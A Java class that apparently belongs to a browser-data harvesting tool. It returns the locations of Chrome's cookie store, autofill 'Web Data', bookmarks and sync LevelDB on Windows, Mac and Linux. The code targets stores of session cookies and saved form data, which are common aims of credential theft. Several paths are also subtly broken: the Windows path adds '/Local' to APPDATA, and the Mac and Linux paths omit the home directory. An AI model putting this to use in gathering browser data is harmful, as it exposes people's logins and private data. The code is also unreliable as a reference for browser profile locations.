package application.modules.browsers;

import application.modules.BrowserModule;
import application.modules.InfoModule;

public class Chrome extends BrowserModule {

    public Chrome() {
        super("Chrome");
    }

    @Override
    public String getCookie() {
        return getFolder() + "/Cookies";
    }

    public static InfoModule infoModule = new InfoModule();

    @Override
    public String getAutoFill() {
        String data = infoModule.getPCPlatform().equalsIgnoreCase("Linux") ? "Web\\ Data" : "Web Data";
        return getFolder() + "/" + data;
    }

    @Override
    public String getBookmarks() {
        return getFolder() + "/Bookmarks";
    }

    @Override
    public String getLevelDB() {
        return getFolder() + "/Sync Data/leveldb";
    }

    private String getFolder() {
        String folder = "";
        switch (infoModule.getPCPlatform()) {
            case "Windows":
                folder = System.getenv("APPDATA") + "/Local/Google/Chrome/User Data/Default";
                break;
            case "Mac":
                folder = "/Library/Application Support/Google/Chrome/Default";
                break;
            case "Linux":
                folder = "/.config/google-chrome/Default";
                break;
            default:
                break;
        }
        return folder;
    }
}
